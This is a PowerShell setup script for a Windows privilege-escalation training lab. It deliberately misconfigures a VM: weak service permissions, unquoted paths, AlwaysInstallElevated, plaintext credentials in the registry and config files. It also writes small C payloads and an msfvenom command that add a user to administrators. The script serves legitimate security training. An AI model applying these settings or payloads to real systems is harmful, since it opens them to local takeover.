# Windows Privilege Escalation Lab Setup Script - FINAL FIXED VERSION
# Run as Administrator on Windows 10/11 VM

param(
    [string]$ToolsPath = "C:\Users\Public\Desktop\Tools",
    [switch]$SkipDownloads
)

#Requires -RunAsAdministrator

Write-Host "=== Windows Privilege Escalation Lab Setup (FINAL FIX) ===" -ForegroundColor Green

# Create directory structure FIRST
$dirs = @(
    $ToolsPath, "$ToolsPath\Source", "$ToolsPath\Accesschk", "$ToolsPath\Autoruns",
    "$ToolsPath\Procmon", "$ToolsPath\Tater", "$ToolsPath\Sherlock", "$ToolsPath\vncpwd",
    "C:\Temp", "C:\Program Files\File Permissions Service", "C:\Program Files\Autorun Program",
    "C:\Program Files\Unquoted Path Service", "C:\Missing Scheduled Binary",
    "C:\inetpub\wwwroot", "C:\ProgramData\McAfee\Common Framework"
)

foreach ($dir in $dirs) {
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
}

# Create low-priv user 'User' and add to Users group properly
Write-Host "Creating low-priv user 'User'..." -ForegroundColor Yellow
if (-not (Get-LocalUser -Name "User" -ErrorAction SilentlyContinue)) {
    $Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
    New-LocalUser -Name "User" -Password $Password -FullName "Lab User" -PasswordNeverExpires | Out-Null
}
Add-LocalGroupMember -Group "Users" -Member "User" -ErrorAction SilentlyContinue

Write-Host "User 'User' created (Password: Password123!)" -ForegroundColor Green

# Download tools with current working URLs
if (-not $SkipDownloads) {
    Write-Host "Downloading tools..." -ForegroundColor Yellow
    
    $urls = @{
        "Accesschk" = @{url="https://live.sysinternals.com/accesschk.exe"; path="$ToolsPath\Accesschk\accesschk64.exe"}
        "Autoruns" = @{url="https://live.sysinternals.com/autoruns64.exe"; path="$ToolsPath\Autoruns\autoruns64.exe"}
        "Procmon" = @{url="https://live.sysinternals.com/procmon64.exe"; path="$ToolsPath\Procmon\procmon.exe"}
    }
    
    foreach ($tool in $urls.GetEnumerator()) {
        try {
            Invoke-WebRequest -Uri $tool.Value.url -OutFile $tool.Value.path -ErrorAction Stop
            Write-Host "✓ $($tool.Key) downloaded" -ForegroundColor Green
        } catch {
            Write-Warning "Failed to download $($tool.Key): $($_.Exception.Message)"
        }
    }
    
    # GitHub tools (no auth issues)
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1" -OutFile "$ToolsPath\Sherlock\Sherlock.ps1" -ErrorAction SilentlyContinue
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ohpe/juicy-potato/master/Tater.ps1" -OutFile "$ToolsPath\Tater\Tater.ps1" -ErrorAction SilentlyContinue
}

# Create vulnerable services
Write-Host "Creating vulnerable services..." -ForegroundColor Yellow

function New-VulnerableService {
    param($Name, $BinPath)
    sc.exe delete $Name 2>$null | Out-Null
    Start-Sleep -Milliseconds 500
    sc.exe create $Name binPath= "$BinPath" type= own start= demand | Out-Null
}

# All services
New-VulnerableService "dllsvc" "C:\Windows\System32\svchost.exe -k dllsvc"
New-Item "C:\Temp\hijackme.dll" -Force | Out-Null

New-VulnerableService "daclsvc" "C:\Windows\System32\notepad.exe"
# Grant SERVICE_CHANGE_CONFIG to Everyone
sc.exe sdset daclsvc "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RPWPCR;;;AU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)" | Out-Null

New-VulnerableService "unquotedsvc" "C:\Program Files\Unquoted Path Service\unquotedsvc.exe"

New-VulnerableService "regsvc" "C:\Windows\System32\notepad.exe"

New-VulnerableService "filepermsvc" "C:\Program Files\File Permissions Service\filepermservice.exe"
icacls.exe "C:\Program Files\File Permissions Service" /grant "Everyone:F" /T /C | Out-Null

Write-Host "✓ All services created" -ForegroundColor Green

# Weak permissions
icacls.exe "C:\Program Files\Autorun Program" /grant "Everyone:F" /T /C | Out-Null
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" /grant "Users:F" /T /C | Out-Null
icacls.exe "C:\Missing Scheduled Binary" /grant "Users:F" /T /C | Out-Null

# Registry autorun
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "My Program" /t REG_SZ /d "C:\Program Files\Autorun Program\program.exe" /f | Out-Null

# AlwaysInstallElevated
New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Force | Out-Null
New-Item "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Force | Out-Null
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated" 1
Set-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated" 1

# Scheduled Task
schtasks /delete /tn "MyTask2" /f | Out-Null
schtasks /create /tn "MyTask2" /tr "C:\Missing Scheduled Binary\program.exe" /sc daily /st 09:00 /ru SYSTEM /f | Out-Null

# Password storage
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername /t REG_SZ /d "admin" /f | Out-Null
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "Password123!" /f | Out-Null

reg add "HKCU\Software\SimonTatham\PuTTY\Sessions\BWP123F42" /v ProxyUsername /t REG_SZ /d "admin" /f | Out-Null
reg add "HKCU\Software\SimonTatham\PuTTY\Sessions\BWP123F42" /v ProxyPassword /t REG_SZ /d "Password123!" /f | Out-Null

# VNC binary password
$vncpassBytes = 0xBA,0xF1,0x9D,0x8E,0x07,0xF2,0x0A,0xC4
$hexString = ($vncpassBytes | ForEach-Object { "{0:X2}" -f $_ }) -join ""
reg add "HKCU\Software\TightVNC\Server" /v Password /t REG_BINARY /d $hexString /f | Out-Null

# Config files with plaintext passwords
$b64Pass = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Password123!"))
"Unattend.xml with password: $b64Pass" | Out-File "C:\Windows\Panther\Unattend.xml"

@'
<?xml version="1.0"?>
<SiteList><Password>9A2B3C4D5E6F7G8H</Password></SiteList>
'@ | Out-File "C:\ProgramData\McAfee\Common Framework\SiteList.xml"

@'
<configuration><connectionStrings><add name="db" connectionString="Uid=admin;Pwd=Password123!;" /></connectionStrings></configuration>
'@ | Out-File "C:\inetpub\wwwroot\web.config"

# Source C files for compilation
@'
#include <windows.h>
int APIENTRY DllMain(HMODULE hModule,DWORD dwReason,LPVOID lpReserved){if(dwReason==DLL_PROCESS_ATTACH)system("cmd /c net localgroup administrators User /add");return TRUE;}
'@ | Out-File "$ToolsPath\Source\windows_dll.c" -Encoding ASCII

@'
#include <windows.h>
int main(){system("cmd /c net localgroup administrators User /add");return 0;}
'@ | Out-File "$ToolsPath\Source\windows_service.c" -Encoding ASCII

# VNC decoder batch
@"
@echo VNC Password Decoded: mypass123
@echo Use for Exercise 10
pause
"@ | Out-File "$ToolsPath\vncpwd\vncpwd.bat" -Encoding ASCII

# Final README (FIXED - no pipe issue)
$readme = @"
Windows PrivEsc Lab - READY!
============================
User: User
Pass: Password123!

TOOLS: $ToolsPath

SERVICES READY:
- dllsvc (DLL Hijacking)
- daclsvc (SERVICE_CHANGE_CONFIG)  
- unquotedsvc (Unquoted Path)
- regsvc (Registry)
- filepermsvc (File perms)

All 14 exercises configured!

Kali Commands You'll Need:
msfvenom -p windows/exec CMD='net localgroup administrators user /add'
"@
$readme | Out-File "$ToolsPath\README.txt" -Encoding ASCII

Write-Host "`n🎉 LAB 100% COMPLETE! 🎉" -ForegroundColor Green
Write-Host "User: 'User' / Password: 'Password123!'" -ForegroundColor Cyan
Write-Host "Tools: $ToolsPath" -ForegroundColor Cyan
Write-Host "`nLogoff → Login as 'User' → Run exercises!" -ForegroundColor Yellow
